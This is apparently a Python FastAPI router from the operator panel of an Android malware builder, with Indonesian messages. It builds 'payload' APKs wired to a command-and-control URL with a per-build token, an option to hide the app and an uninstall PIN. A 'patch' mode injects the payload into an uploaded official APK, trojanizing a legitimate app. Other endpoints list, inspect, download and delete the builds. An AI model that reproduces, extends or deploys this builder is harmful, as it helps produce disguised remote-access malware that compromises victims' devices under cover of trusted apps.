"""API build & patch APK."""
from __future__ import annotations

import asyncio
import re
import secrets
import shutil
from pathlib import Path

from fastapi import APIRouter, Depends, File, Form, HTTPException, UploadFile
from fastapi.responses import FileResponse

from . import builder, config, db, security

router = APIRouter(prefix="/api/build", dependencies=[Depends(security.require_operator)])

PKG_RE = re.compile(r"^[a-z][a-z0-9_]*(\.[a-z0-9_]+)+$")


def _save_upload(f: UploadFile | None, prefix: str) -> Path | None:
    if f is None or not f.filename:
        return None
    dest = config.UPLOAD_DIR / f"{prefix}_{secrets.token_hex(4)}_{Path(f.filename).name}"
    with dest.open("wb") as out:
        shutil.copyfileobj(f.file, out)
    return dest


@router.get("")
async def list_builds() -> dict:
    rows = [dict(r) for r in db.q("SELECT * FROM builds ORDER BY created DESC LIMIT 100")]
    return {"builds": rows}


@router.get("/{build_id}")
async def status(build_id: str) -> dict:
    row = db.one("SELECT * FROM builds WHERE id=?", (build_id,))
    if row is None:
        raise HTTPException(404, "Build tidak ditemukan")
    return dict(row)


@router.post("/create")
async def create(
    mode: str = Form("new"),
    name: str = Form(""),
    package: str = Form(""),
    c2_url: str = Form(""),
    hide: str = Form("0"),
    wizard: str = Form(""),
    apk: UploadFile | None = File(None),
    icon: UploadFile | None = File(None),
    wallpaper: UploadFile | None = File(None),
) -> dict:
    if mode not in {"new", "patch"}:
        raise HTTPException(400, "mode harus 'new' atau 'patch'")
    if mode == "patch" and apk is None:
        raise HTTPException(400, "APK resmi wajib diunggah untuk mode patch")

    pkg = package.strip()
    if mode == "new":
        if not pkg:
            pkg = f"ai.m4zk1play.{secrets.token_hex(3)}"
        if not PKG_RE.match(pkg):
            raise HTTPException(400, "Format package tidak valid (contoh: com.app.saya)")
    elif pkg and not PKG_RE.match(pkg):
        raise HTTPException(400, "Format package tidak valid")

    src = _save_upload(apk, "src")
    icon_path = _save_upload(icon, "icon")
    wall_path = _save_upload(wallpaper, "wall")

    token = builder.new_token()
    public = c2_url.strip() or str(config.get("c2_public_url")) or "http://127.0.0.1:8777"

    opts = {
        "c2_url": public,
        "token": token,
        "pin": str(config.get("uninstall_pin")),
        "email": str(config.get("contact_email")),
        "team": str(config.get("contact_team")),
        "hide": hide in {"1", "true", "on"},
        "label": name.strip(),
        "wizard": wizard,
        "icon": str(icon_path) if icon_path else "",
        "wallpaper": str(wall_path) if wall_path else "",
    }

    build_id = builder.create_build(
        opts["label"] or pkg or "payload", pkg, mode, src, opts
    )
    asyncio.create_task(builder.run_job(build_id, mode, src, opts))
    db.audit("build", f"{mode} :: {pkg}")
    return {"ok": True, "id": build_id, "package": pkg, "token": token, "c2_url": public}


@router.post("/inspect")
async def inspect(apk: UploadFile = File(...)) -> dict:
    src = _save_upload(apk, "insp")
    if src is None:
        raise HTTPException(400, "File kosong")
    info = await asyncio.get_running_loop().run_in_executor(None, builder.inspect_apk, src)
    src.unlink(missing_ok=True)
    return info


@router.get("/{build_id}/download")
async def download(build_id: str) -> FileResponse:
    row = db.one("SELECT * FROM builds WHERE id=?", (build_id,))
    if row is None or not row["outfile"]:
        raise HTTPException(404, "Artefak belum tersedia")
    path = Path(row["outfile"])
    if not path.exists():
        raise HTTPException(410, "File build hilang")
    return FileResponse(
        path,
        filename=f"{row['name'] or 'payload'}.apk",
        media_type="application/vnd.android.package-archive",
    )


@router.delete("/{build_id}")
async def drop(build_id: str) -> dict:
    row = db.one("SELECT outfile FROM builds WHERE id=?", (build_id,))
    if row and row["outfile"]:
        Path(row["outfile"]).unlink(missing_ok=True)
    db.x("DELETE FROM builds WHERE id=?", (build_id,))
    return {"ok": True}
